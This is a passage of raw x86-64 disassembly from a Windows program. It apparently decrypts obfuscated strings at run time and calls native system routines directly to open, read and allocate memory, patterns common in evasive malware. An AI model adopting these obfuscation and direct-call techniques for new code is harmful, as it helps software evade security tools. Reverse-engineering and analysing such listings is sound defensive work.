   140006277:	03 05 fb 86 28 00    	add    0x2886fb(%rip),%eax        # 0x14028e978
   14000627d:	0f b6 c0             	movzbl %al,%eax
   140006280:	66 89 05 f1 86 28 00 	mov    %ax,0x2886f1(%rip)        # 0x14028e978
   140006287:	0f b7 05 ec 86 28 00 	movzwl 0x2886ec(%rip),%eax        # 0x14028e97a
   14000628e:	05 f3 00 00 00       	add    $0xf3,%eax
   140006293:	0f b6 c0             	movzbl %al,%eax
   140006296:	66 89 05 dd 86 28 00 	mov    %ax,0x2886dd(%rip)        # 0x14028e97a
   14000629d:	c6 05 d8 86 28 00 00 	movb   $0x0,0x2886d8(%rip)        # 0x14028e97c
   1400062a4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400062a9:	4c 8d 0d 80 86 28 00 	lea    0x288680(%rip),%r9        # 0x14028e930
   1400062b0:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400062b7:	b1 01                	mov    $0x1,%cl
   1400062b9:	49 89 f8             	mov    %rdi,%r8
   1400062bc:	e8 2f cb ff ff       	call   0x140002df0
   1400062c1:	80 3d f5 7b 28 00 00 	cmpb   $0x0,0x287bf5(%rip)        # 0x14028debd
   1400062c8:	0f 84 de 18 00 00    	je     0x140007bac
   1400062ce:	80 3d 2f 87 28 00 00 	cmpb   $0x0,0x28872f(%rip)        # 0x14028ea04
   1400062d5:	0f 84 fe 00 00 00    	je     0x1400063d9
   1400062db:	66 0f 6f 05 2d 47 00 	movdqa 0x472d(%rip),%xmm0        # 0x14000aa10
   1400062e2:	00 
   1400062e3:	66 0f 6f 15 95 86 28 	movdqa 0x288695(%rip),%xmm2        # 0x14028e980
   1400062ea:	00 
   1400062eb:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400062ef:	66 0f 6f 0d 29 43 00 	movdqa 0x4329(%rip),%xmm1        # 0x14000a620
   1400062f6:	00 
   1400062f7:	66 0f db d1          	pand   %xmm1,%xmm2
   1400062fb:	66 0f 7f 15 7d 86 28 	movdqa %xmm2,0x28867d(%rip)        # 0x14028e980
   140006302:	00 
   140006303:	66 0f 6f 15 85 86 28 	movdqa 0x288685(%rip),%xmm2        # 0x14028e990
   14000630a:	00 
   14000630b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000630f:	66 0f db d1          	pand   %xmm1,%xmm2
   140006313:	66 0f 7f 15 75 86 28 	movdqa %xmm2,0x288675(%rip)        # 0x14028e990
   14000631a:	00 
   14000631b:	66 0f 6f 15 7d 86 28 	movdqa 0x28867d(%rip),%xmm2        # 0x14028e9a0
   140006322:	00 
   140006323:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006327:	66 0f db d1          	pand   %xmm1,%xmm2
   14000632b:	66 0f 7f 15 6d 86 28 	movdqa %xmm2,0x28866d(%rip)        # 0x14028e9a0
   140006332:	00 
   140006333:	66 0f 6f 15 75 86 28 	movdqa 0x288675(%rip),%xmm2        # 0x14028e9b0
   14000633a:	00 
   14000633b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000633f:	66 0f db d1          	pand   %xmm1,%xmm2
   140006343:	66 0f 7f 15 65 86 28 	movdqa %xmm2,0x288665(%rip)        # 0x14028e9b0
   14000634a:	00 
   14000634b:	66 0f 6f 15 6d 86 28 	movdqa 0x28866d(%rip),%xmm2        # 0x14028e9c0
   140006352:	00 
   140006353:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006357:	66 0f db d1          	pand   %xmm1,%xmm2
   14000635b:	66 0f 7f 15 5d 86 28 	movdqa %xmm2,0x28865d(%rip)        # 0x14028e9c0
   140006362:	00 
   140006363:	66 0f 6f 15 65 86 28 	movdqa 0x288665(%rip),%xmm2        # 0x14028e9d0
   14000636a:	00 
   14000636b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000636f:	66 0f db d1          	pand   %xmm1,%xmm2
   140006373:	66 0f 7f 15 55 86 28 	movdqa %xmm2,0x288655(%rip)        # 0x14028e9d0
   14000637a:	00 
   14000637b:	66 0f 6f 15 5d 86 28 	movdqa 0x28865d(%rip),%xmm2        # 0x14028e9e0
   140006382:	00 
   140006383:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006387:	66 0f db d1          	pand   %xmm1,%xmm2
   14000638b:	66 0f 7f 15 4d 86 28 	movdqa %xmm2,0x28864d(%rip)        # 0x14028e9e0
   140006392:	00 
   140006393:	66 0f fd 05 55 86 28 	paddw  0x288655(%rip),%xmm0        # 0x14028e9f0
   14000639a:	00 
   14000639b:	66 0f db c1          	pand   %xmm1,%xmm0
   14000639f:	66 0f 7f 05 49 86 28 	movdqa %xmm0,0x288649(%rip)        # 0x14028e9f0
   1400063a6:	00 
   1400063a7:	b8 85 00 00 00       	mov    $0x85,%eax
   1400063ac:	03 05 4e 86 28 00    	add    0x28864e(%rip),%eax        # 0x14028ea00
   1400063b2:	0f b6 c0             	movzbl %al,%eax
   1400063b5:	66 89 05 44 86 28 00 	mov    %ax,0x288644(%rip)        # 0x14028ea00
   1400063bc:	0f b7 05 3f 86 28 00 	movzwl 0x28863f(%rip),%eax        # 0x14028ea02
   1400063c3:	05 85 00 00 00       	add    $0x85,%eax
   1400063c8:	0f b6 c0             	movzbl %al,%eax
   1400063cb:	66 89 05 30 86 28 00 	mov    %ax,0x288630(%rip)        # 0x14028ea02
   1400063d2:	c6 05 2b 86 28 00 00 	movb   $0x0,0x28862b(%rip)        # 0x14028ea04
   1400063d9:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400063de:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400063e3:	4c 8d 0d 96 85 28 00 	lea    0x288596(%rip),%r9        # 0x14028e980
   1400063ea:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400063f1:	b1 01                	mov    $0x1,%cl
   1400063f3:	49 89 f8             	mov    %rdi,%r8
   1400063f6:	e8 f5 c9 ff ff       	call   0x140002df0
   1400063fb:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   140006402:	48 8d 95 20 0a 00 00 	lea    0xa20(%rbp),%rdx
   140006409:	e8 62 39 00 00       	call   0x140009d70
   14000640e:	85 c0                	test   %eax,%eax
   140006410:	0f 84 f8 03 00 00    	je     0x14000680e
   140006416:	48 8d b5 50 10 00 00 	lea    0x1050(%rbp),%rsi
   14000641d:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140006423:	48 89 f1             	mov    %rsi,%rcx
   140006426:	31 d2                	xor    %edx,%edx
   140006428:	e8 a3 39 00 00       	call   0x140009dd0
   14000642d:	80 3d 95 7a 28 00 00 	cmpb   $0x0,0x287a95(%rip)        # 0x14028dec9
   140006434:	0f 84 2e 18 00 00    	je     0x140007c68
   14000643a:	80 3d f1 8c 28 00 00 	cmpb   $0x0,0x288cf1(%rip)        # 0x14028f132
   140006441:	74 3c                	je     0x14000647f
   140006443:	f3 0f 7e 05 dd 8c 28 	movq   0x288cdd(%rip),%xmm0        # 0x14028f128
   14000644a:	00 
   14000644b:	66 0f fd 05 cd 45 00 	paddw  0x45cd(%rip),%xmm0        # 0x14000aa20
   140006452:	00 
   140006453:	66 0f db 05 05 42 00 	pand   0x4205(%rip),%xmm0        # 0x14000a660
   14000645a:	00 
   14000645b:	66 0f d6 05 c5 8c 28 	movq   %xmm0,0x288cc5(%rip)        # 0x14028f128
   140006462:	00 
   140006463:	b8 c5 00 00 00       	mov    $0xc5,%eax
   140006468:	03 05 c2 8c 28 00    	add    0x288cc2(%rip),%eax        # 0x14028f130
   14000646e:	0f b6 c0             	movzbl %al,%eax
   140006471:	66 89 05 b8 8c 28 00 	mov    %ax,0x288cb8(%rip)        # 0x14028f130
   140006478:	c6 05 b3 8c 28 00 00 	movb   $0x0,0x288cb3(%rip)        # 0x14028f132
   14000647f:	48 8d 15 a2 8c 28 00 	lea    0x288ca2(%rip),%rdx        # 0x14028f128
   140006486:	48 89 f1             	mov    %rsi,%rcx
   140006489:	e8 52 38 00 00       	call   0x140009ce0
   14000648e:	48 8d 95 30 0c 00 00 	lea    0xc30(%rbp),%rdx
   140006495:	48 89 f1             	mov    %rsi,%rcx
   140006498:	e8 33 38 00 00       	call   0x140009cd0
   14000649d:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   1400064a4:	00 00 00 00 
   1400064a8:	48 89 f1             	mov    %rsi,%rcx
   1400064ab:	e8 40 38 00 00       	call   0x140009cf0
   1400064b0:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400064b7:	01 c0                	add    %eax,%eax
   1400064b9:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   1400064c0:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   1400064c7:	48 89 b5 48 17 00 00 	mov    %rsi,0x1748(%rbp)
   1400064ce:	0f 57 f6             	xorps  %xmm6,%xmm6
   1400064d1:	0f 29 b5 70 14 00 00 	movaps %xmm6,0x1470(%rbp)
   1400064d8:	0f 29 b5 80 14 00 00 	movaps %xmm6,0x1480(%rbp)
   1400064df:	c7 85 70 14 00 00 30 	movl   $0x30,0x1470(%rbp)
   1400064e6:	00 00 00 
   1400064e9:	c7 85 88 14 00 00 40 	movl   $0x40,0x1488(%rbp)
   1400064f0:	00 00 00 
   1400064f3:	48 8d 85 40 17 00 00 	lea    0x1740(%rbp),%rax
   1400064fa:	48 89 85 80 14 00 00 	mov    %rax,0x1480(%rbp)
   140006501:	0f 29 b5 90 14 00 00 	movaps %xmm6,0x1490(%rbp)
   140006508:	48 c7 85 38 17 00 00 	movq   $0x0,0x1738(%rbp)
   14000650f:	00 00 00 00 
   140006513:	0f 29 b5 20 17 00 00 	movaps %xmm6,0x1720(%rbp)
   14000651a:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140006521:	00 
   140006522:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140006529:	00 
   14000652a:	48 8d 8d 38 17 00 00 	lea    0x1738(%rbp),%rcx
   140006531:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006538:	48 8d b5 20 17 00 00 	lea    0x1720(%rbp),%rsi
   14000653f:	ba 00 00 10 80       	mov    $0x80100000,%edx
   140006544:	49 89 f1             	mov    %rsi,%r9
   140006547:	e8 21 af ff ff       	call   0x14000146d
   14000654c:	0f 29 b5 00 17 00 00 	movaps %xmm6,0x1700(%rbp)
   140006553:	48 c7 85 10 17 00 00 	movq   $0x0,0x1710(%rbp)
   14000655a:	00 00 00 00 
   14000655e:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   140006565:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   14000656c:	00 
   14000656d:	4c 8d 85 00 17 00 00 	lea    0x1700(%rbp),%r8
   140006574:	48 89 f2             	mov    %rsi,%rdx
   140006577:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   14000657d:	e8 ae af ff ff       	call   0x140001530
   140006582:	85 c0                	test   %eax,%eax
   140006584:	0f 88 29 1a 00 00    	js     0x140007fb3
   14000658a:	4c 8b b5 08 17 00 00 	mov    0x1708(%rbp),%r14
   140006591:	48 c7 85 f0 16 00 00 	movq   $0x0,0x16f0(%rbp)
   140006598:	00 00 00 00 
   14000659c:	4c 89 b5 90 16 00 00 	mov    %r14,0x1690(%rbp)
   1400065a3:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400065aa:	00 
   1400065ab:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   1400065b2:	00 
   1400065b3:	48 8d 95 f0 16 00 00 	lea    0x16f0(%rbp),%rdx
   1400065ba:	31 db                	xor    %ebx,%ebx
   1400065bc:	4c 8d 8d 90 16 00 00 	lea    0x1690(%rbp),%r9
   1400065c3:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400065ca:	45 31 c0             	xor    %r8d,%r8d
   1400065cd:	e8 d7 ae ff ff       	call   0x1400014a9
   1400065d2:	85 c0                	test   %eax,%eax
   1400065d4:	78 50                	js     0x140006626
   1400065d6:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   1400065dd:	48 8b 85 f0 16 00 00 	mov    0x16f0(%rbp),%rax
   1400065e4:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400065e8:	f3 0f 7f 44 24 38    	movdqu %xmm0,0x38(%rsp)
   1400065ee:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1400065f3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400065f8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400065fd:	31 d2                	xor    %edx,%edx
   1400065ff:	45 31 c0             	xor    %r8d,%r8d
   140006602:	45 31 c9             	xor    %r9d,%r9d
   140006605:	e8 36 ae ff ff       	call   0x140001440
   14000660a:	85 c0                	test   %eax,%eax
   14000660c:	78 18                	js     0x140006626
   14000660e:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   140006615:	e8 44 ae ff ff       	call   0x14000145e
   14000661a:	48 8b 95 f0 16 00 00 	mov    0x16f0(%rbp),%rdx
   140006621:	44 89 f3             	mov    %r14d,%ebx
   140006624:	eb 0e                	jmp    0x140006634
   140006626:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   14000662d:	e8 2c ae ff ff       	call   0x14000145e
   140006632:	31 d2                	xor    %edx,%edx
   140006634:	48 89 95 50 10 00 00 	mov    %rdx,0x1050(%rbp)
   14000663b:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   140006642:	41 89 d8             	mov    %ebx,%r8d
   140006645:	e8 06 cd ff ff       	call   0x140003350
   14000664a:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   140006651:	00 00 00 00 
   140006655:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   14000665c:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006663:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000666a:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140006670:	e8 52 ae ff ff       	call   0x1400014c7
   140006675:	80 3d 42 78 28 00 00 	cmpb   $0x0,0x287842(%rip)        # 0x14028debe
   14000667c:	0f 84 2c 16 00 00    	je     0x140007cae
   140006682:	80 3d a9 83 28 00 00 	cmpb   $0x0,0x2883a9(%rip)        # 0x14028ea32
   140006689:	74 56                	je     0x1400066e1
   14000668b:	66 0f 6f 05 9d 43 00 	movdqa 0x439d(%rip),%xmm0        # 0x14000aa30
   140006692:	00 
   140006693:	66 0f 6f 0d 75 83 28 	movdqa 0x288375(%rip),%xmm1        # 0x14028ea10
   14000669a:	00 
   14000669b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000669f:	66 0f 6f 15 79 3f 00 	movdqa 0x3f79(%rip),%xmm2        # 0x14000a620
   1400066a6:	00 
   1400066a7:	66 0f db ca          	pand   %xmm2,%xmm1
   1400066ab:	66 0f 7f 0d 5d 83 28 	movdqa %xmm1,0x28835d(%rip)        # 0x14028ea10
   1400066b2:	00 
   1400066b3:	66 0f fd 05 65 83 28 	paddw  0x288365(%rip),%xmm0        # 0x14028ea20
   1400066ba:	00 
   1400066bb:	66 0f db c2          	pand   %xmm2,%xmm0
   1400066bf:	66 0f 7f 05 59 83 28 	movdqa %xmm0,0x288359(%rip)        # 0x14028ea20
   1400066c6:	00 
   1400066c7:	8b 05 63 83 28 00    	mov    0x288363(%rip),%eax        # 0x14028ea30
   1400066cd:	83 c0 7b             	add    $0x7b,%eax
   1400066d0:	0f b6 c0             	movzbl %al,%eax
   1400066d3:	66 89 05 56 83 28 00 	mov    %ax,0x288356(%rip)        # 0x14028ea30
   1400066da:	c6 05 51 83 28 00 00 	movb   $0x0,0x288351(%rip)        # 0x14028ea32
   1400066e1:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400066e6:	4c 8d 0d 23 83 28 00 	lea    0x288323(%rip),%r9        # 0x14028ea10
   1400066ed:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400066f4:	31 c9                	xor    %ecx,%ecx
   1400066f6:	49 89 f8             	mov    %rdi,%r8
   1400066f9:	e8 f2 c6 ff ff       	call   0x140002df0
   1400066fe:	80 3d ba 77 28 00 00 	cmpb   $0x0,0x2877ba(%rip)        # 0x14028debf
   140006705:	0f 84 d4 15 00 00    	je     0x140007cdf
   14000670b:	80 3d 78 83 28 00 00 	cmpb   $0x0,0x288378(%rip)        # 0x14028ea8a
   140006712:	0f 84 d4 00 00 00    	je     0x1400067ec
   140006718:	66 0f 6f 05 b0 3f 00 	movdqa 0x3fb0(%rip),%xmm0        # 0x14000a6d0
   14000671f:	00 
   140006720:	66 0f 6f 0d 18 83 28 	movdqa 0x288318(%rip),%xmm1        # 0x14028ea40
   140006727:	00 
   140006728:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000672c:	66 0f 6f 15 ec 3e 00 	movdqa 0x3eec(%rip),%xmm2        # 0x14000a620
   140006733:	00 
   140006734:	66 0f db ca          	pand   %xmm2,%xmm1
   140006738:	66 0f 7f 0d 00 83 28 	movdqa %xmm1,0x288300(%rip)        # 0x14028ea40
   14000673f:	00 
   140006740:	66 0f 6f 0d 08 83 28 	movdqa 0x288308(%rip),%xmm1        # 0x14028ea50
   140006747:	00 
   140006748:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000674c:	66 0f db ca          	pand   %xmm2,%xmm1
   140006750:	66 0f 7f 0d f8 82 28 	movdqa %xmm1,0x2882f8(%rip)        # 0x14028ea50
   140006757:	00 
   140006758:	66 0f 6f 0d 00 83 28 	movdqa 0x288300(%rip),%xmm1        # 0x14028ea60
   14000675f:	00 
   140006760:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006764:	66 0f db ca          	pand   %xmm2,%xmm1
   140006768:	66 0f 7f 0d f0 82 28 	movdqa %xmm1,0x2882f0(%rip)        # 0x14028ea60
   14000676f:	00 
   140006770:	66 0f fd 05 f8 82 28 	paddw  0x2882f8(%rip),%xmm0        # 0x14028ea70
   140006777:	00 
   140006778:	66 0f db c2          	pand   %xmm2,%xmm0
   14000677c:	66 0f 7f 05 ec 82 28 	movdqa %xmm0,0x2882ec(%rip)        # 0x14028ea70
   140006783:	00 
   140006784:	8b 05 f6 82 28 00    	mov    0x2882f6(%rip),%eax        # 0x14028ea80
   14000678a:	83 c0 2f             	add    $0x2f,%eax
   14000678d:	0f b6 c0             	movzbl %al,%eax
   140006790:	66 89 05 e9 82 28 00 	mov    %ax,0x2882e9(%rip)        # 0x14028ea80
   140006797:	0f b7 05 e4 82 28 00 	movzwl 0x2882e4(%rip),%eax        # 0x14028ea82
   14000679e:	83 c0 2f             	add    $0x2f,%eax
   1400067a1:	0f b6 c0             	movzbl %al,%eax
   1400067a4:	66 89 05 d7 82 28 00 	mov    %ax,0x2882d7(%rip)        # 0x14028ea82
   1400067ab:	8b 05 d3 82 28 00    	mov    0x2882d3(%rip),%eax        # 0x14028ea84
   1400067b1:	83 c0 2f             	add    $0x2f,%eax
   1400067b4:	0f b6 c0             	movzbl %al,%eax
   1400067b7:	66 89 05 c6 82 28 00 	mov    %ax,0x2882c6(%rip)        # 0x14028ea84
   1400067be:	0f b7 05 c1 82 28 00 	movzwl 0x2882c1(%rip),%eax        # 0x14028ea86
   1400067c5:	83 c0 2f             	add    $0x2f,%eax
   1400067c8:	0f b6 c0             	movzbl %al,%eax
   1400067cb:	66 89 05 b4 82 28 00 	mov    %ax,0x2882b4(%rip)        # 0x14028ea86
   1400067d2:	8b 05 b0 82 28 00    	mov    0x2882b0(%rip),%eax        # 0x14028ea88
   1400067d8:	83 c0 2f             	add    $0x2f,%eax
   1400067db:	0f b6 c0             	movzbl %al,%eax
   1400067de:	66 89 05 a3 82 28 00 	mov    %ax,0x2882a3(%rip)        # 0x14028ea88
   1400067e5:	c6 05 9e 82 28 00 00 	movb   $0x0,0x28829e(%rip)        # 0x14028ea8a
   1400067ec:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400067f1:	4c 8d 0d 48 82 28 00 	lea    0x288248(%rip),%r9        # 0x14028ea40
   1400067f8:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400067ff:	31 c9                	xor    %ecx,%ecx
   140006801:	49 89 f8             	mov    %rdi,%r8
   140006804:	e8 e7 c5 ff ff       	call   0x140002df0
   140006809:	e9 6f 07 00 00       	jmp    0x140006f7d
   14000680e:	80 3d ab 76 28 00 00 	cmpb   $0x0,0x2876ab(%rip)        # 0x14028dec0
   140006815:	0f 84 38 15 00 00    	je     0x140007d53
   14000681b:	80 3d ae 82 28 00 00 	cmpb   $0x0,0x2882ae(%rip)        # 0x14028ead0
   140006822:	74 73                	je     0x140006897
   140006824:	66 0f 6f 05 14 42 00 	movdqa 0x4214(%rip),%xmm0        # 0x14000aa40
   14000682b:	00 
   14000682c:	66 0f 6f 0d 5c 82 28 	movdqa 0x28825c(%rip),%xmm1        # 0x14028ea90
   140006833:	00 
   140006834:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006838:	66 0f 6f 15 e0 3d 00 	movdqa 0x3de0(%rip),%xmm2        # 0x14000a620
   14000683f:	00 
   140006840:	66 0f db ca          	pand   %xmm2,%xmm1
   140006844:	66 0f 7f 0d 44 82 28 	movdqa %xmm1,0x288244(%rip)        # 0x14028ea90
   14000684b:	00 
   14000684c:	66 0f 6f 0d 4c 82 28 	movdqa 0x28824c(%rip),%xmm1        # 0x14028eaa0
   140006853:	00 
   140006854:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006858:	66 0f db ca          	pand   %xmm2,%xmm1
   14000685c:	66 0f 7f 0d 3c 82 28 	movdqa %xmm1,0x28823c(%rip)        # 0x14028eaa0
   140006863:	00 
   140006864:	66 0f 6f 0d 44 82 28 	movdqa 0x288244(%rip),%xmm1        # 0x14028eab0
   14000686b:	00 
   14000686c:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006870:	66 0f db ca          	pand   %xmm2,%xmm1
   140006874:	66 0f 7f 0d 34 82 28 	movdqa %xmm1,0x288234(%rip)        # 0x14028eab0
   14000687b:	00 
   14000687c:	66 0f fd 05 3c 82 28 	paddw  0x28823c(%rip),%xmm0        # 0x14028eac0
   140006883:	00 
   140006884:	66 0f db c2          	pand   %xmm2,%xmm0
   140006888:	66 0f 7f 05 30 82 28 	movdqa %xmm0,0x288230(%rip)        # 0x14028eac0
   14000688f:	00 
   140006890:	c6 05 39 82 28 00 00 	movb   $0x0,0x288239(%rip)        # 0x14028ead0
   140006897:	44 88 64 24 38       	mov    %r12b,0x38(%rsp)
   14000689c:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400068a1:	4c 8d 8d 00 06 00 00 	lea    0x600(%rbp),%r9
   1400068a8:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400068ad:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400068b4:	00 00 
   1400068b6:	48 8d 0d d3 81 28 00 	lea    0x2881d3(%rip),%rcx        # 0x14028ea90
   1400068bd:	48 8d 15 9c 67 00 00 	lea    0x679c(%rip),%rdx        # 0x14000d060
   1400068c4:	41 b8 20 d4 00 00    	mov    $0xd420,%r8d
   1400068ca:	e8 f1 d0 ff ff       	call   0x1400039c0
   1400068cf:	80 3d eb 75 28 00 00 	cmpb   $0x0,0x2875eb(%rip)        # 0x14028dec1
   1400068d6:	0f 84 a8 14 00 00    	je     0x140007d84
   1400068dc:	80 3d 01 82 28 00 00 	cmpb   $0x0,0x288201(%rip)        # 0x14028eae4
   1400068e3:	74 47                	je     0x14000692c
   1400068e5:	f3 0f 7e 05 eb 81 28 	movq   0x2881eb(%rip),%xmm0        # 0x14028ead8
   1400068ec:	00 
   1400068ed:	66 0f fd 05 5b 41 00 	paddw  0x415b(%rip),%xmm0        # 0x14000aa50
   1400068f4:	00 
   1400068f5:	66 0f db 05 63 3d 00 	pand   0x3d63(%rip),%xmm0        # 0x14000a660
   1400068fc:	00 
   1400068fd:	66 0f d6 05 d3 81 28 	movq   %xmm0,0x2881d3(%rip)        # 0x14028ead8
   140006904:	00 
   140006905:	f3 0f 7e 05 d3 81 28 	movq   0x2881d3(%rip),%xmm0        # 0x14028eae0
   14000690c:	00 
   14000690d:	66 0f fd 05 4b 41 00 	paddw  0x414b(%rip),%xmm0        # 0x14000aa60
   140006914:	00 
   140006915:	66 0f db 05 73 3d 00 	pand   0x3d73(%rip),%xmm0        # 0x14000a690
   14000691c:	00 
   14000691d:	66 0f 7e 05 bb 81 28 	movd   %xmm0,0x2881bb(%rip)        # 0x14028eae0
   140006924:	00 
   140006925:	c6 05 b8 81 28 00 00 	movb   $0x0,0x2881b8(%rip)        # 0x14028eae4
   14000692c:	48 8d 0d a5 81 28 00 	lea    0x2881a5(%rip),%rcx        # 0x14028ead8
   140006933:	e8 b8 33 00 00       	call   0x140009cf0
   140006938:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   14000693c:	0f 84 36 01 00 00    	je     0x140006a78
   140006942:	48 89 c3             	mov    %rax,%rbx
   140006945:	4c 8d 35 8c 81 28 00 	lea    0x28818c(%rip),%r14        # 0x14028ead8
   14000694c:	31 ff                	xor    %edi,%edi
   14000694e:	49 89 f7             	mov    %rsi,%r15
   140006951:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140006958:	0f 1f 84 00 00 00 00 
   14000695f:	00 
   140006960:	4c 89 f9             	mov    %r15,%rcx
   140006963:	4c 89 f2             	mov    %r14,%rdx
   140006966:	49 89 d8             	mov    %rbx,%r8
   140006969:	e8 12 34 00 00       	call   0x140009d80
   14000696e:	85 c0                	test   %eax,%eax
   140006970:	0f 84 06 01 00 00    	je     0x140006a7c
   140006976:	4c 89 f9             	mov    %r15,%rcx
   140006979:	e8 72 33 00 00       	call   0x140009cf0
   14000697e:	66 41 83 7c 47 02 00 	cmpw   $0x0,0x2(%r15,%rax,2)
   140006985:	4d 8d 7c 47 02       	lea    0x2(%r15,%rax,2),%r15
   14000698a:	75 d4                	jne    0x140006960
   14000698c:	e9 ef 00 00 00       	jmp    0x140006a80
   140006991:	80 3d fc 74 28 00 00 	cmpb   $0x0,0x2874fc(%rip)        # 0x14028de94
   140006998:	0f 84 ce 15 00 00    	je     0x140007f6c
   14000699e:	80 3d 0f 76 28 00 00 	cmpb   $0x0,0x28760f(%rip)        # 0x14028dfb4
   1400069a5:	74 47                	je     0x1400069ee
   1400069a7:	f3 0f 7e 05 f9 75 28 	movq   0x2875f9(%rip),%xmm0        # 0x14028dfa8
   1400069ae:	00 
   1400069af:	66 0f fd 05 99 3e 00 	paddw  0x3e99(%rip),%xmm0        # 0x14000a850
   1400069b6:	00 
   1400069b7:	66 0f db 05 a1 3c 00 	pand   0x3ca1(%rip),%xmm0        # 0x14000a660
   1400069be:	00 
   1400069bf:	66 0f d6 05 e1 75 28 	movq   %xmm0,0x2875e1(%rip)        # 0x14028dfa8
   1400069c6:	00 
   1400069c7:	f3 0f 7e 05 e1 75 28 	movq   0x2875e1(%rip),%xmm0        # 0x14028dfb0
   1400069ce:	00 
   1400069cf:	66 0f fd 05 19 40 00 	paddw  0x4019(%rip),%xmm0        # 0x14000a9f0
   1400069d6:	00 
   1400069d7:	66 0f db 05 b1 3c 00 	pand   0x3cb1(%rip),%xmm0        # 0x14000a690
   1400069de:	00 
   1400069df:	66 0f 7e 05 c9 75 28 	movd   %xmm0,0x2875c9(%rip)        # 0x14028dfb0
   1400069e6:	00 
   1400069e7:	c6 05 c6 75 28 00 00 	movb   $0x0,0x2875c6(%rip)        # 0x14028dfb4
   1400069ee:	4c 8d 3d b3 75 28 00 	lea    0x2875b3(%rip),%r15        # 0x14028dfa8
   1400069f5:	4c 89 f9             	mov    %r15,%rcx
   1400069f8:	e8 f3 32 00 00       	call   0x140009cf0
   1400069fd:	89 c1                	mov    %eax,%ecx
   1400069ff:	c1 e1 11             	shl    $0x11,%ecx
   140006a02:	25 ff 7f 00 00       	and    $0x7fff,%eax
   140006a07:	8d 04 41             	lea    (%rcx,%rax,2),%eax
   140006a0a:	05 00 00 02 00       	add    $0x20000,%eax
   140006a0f:	48 89 85 40 17 00 00 	mov    %rax,0x1740(%rbp)
   140006a16:	4c 89 bd 48 17 00 00 	mov    %r15,0x1748(%rbp)
   140006a1d:	48 8b 8d 20 17 00 00 	mov    0x1720(%rbp),%rcx
   140006a24:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140006a29:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   140006a30:	00 
   140006a31:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   140006a38:	4c 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%r9
   140006a3f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006a45:	e8 5e ab ff ff       	call   0x1400015a8
   140006a4a:	41 89 c7             	mov    %eax,%r15d
   140006a4d:	44 8b b5 5c 10 00 00 	mov    0x105c(%rbp),%r14d
   140006a54:	48 8b 8d 20 17 00 00 	mov    0x1720(%rbp),%rcx
   140006a5b:	e8 fe a9 ff ff       	call   0x14000145e
   140006a60:	45 85 ff             	test   %r15d,%r15d
   140006a63:	0f 88 31 f7 ff ff    	js     0x14000619a
   140006a69:	41 83 fe 02          	cmp    $0x2,%r14d
   140006a6d:	0f 84 88 f9 ff ff    	je     0x1400063fb
   140006a73:	e9 22 f7 ff ff       	jmp    0x14000619a
   140006a78:	31 ff                	xor    %edi,%edi
